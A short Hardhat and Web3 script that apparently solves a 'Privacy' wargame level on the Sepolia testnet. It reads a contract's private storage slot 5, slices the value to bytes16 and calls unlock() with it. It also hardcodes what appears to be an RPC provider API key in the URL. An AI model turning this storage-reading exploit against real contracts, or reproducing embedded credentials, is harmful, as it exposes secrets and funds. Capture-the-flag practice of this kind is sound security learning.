import { ethers } from "hardhat";
import Web3 from "web3";

var web3 = new Web3(
  Web3.givenProvider ||
    "https://eth-sepolia.g.alchemy.com/v2/dLVCsT0-CYcEMTDC1RUt7Vn8PRrzpf07"
);

async function handleReal() {
  const privacy = await ethers.getContractAt(
    "Privacy",
    "0x61566a16bB69305b5a9229f26ff4758038c3FC34"
  );

  // Web3 library not needed but learned as well so GGs
  const dataAtIndex2 = await web3.eth.getStorageAt(
    "0x61566a16bB69305b5a9229f26ff4758038c3FC34",
    5 // Number 5 because array starts at 3
  );

  // When parsing 32byte to 16byte -> take the left half
  const dataAtIndex2toBytes16 = dataAtIndex2.slice(0, 34);

  await privacy.unlock(dataAtIndex2toBytes16);
}

handleReal().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
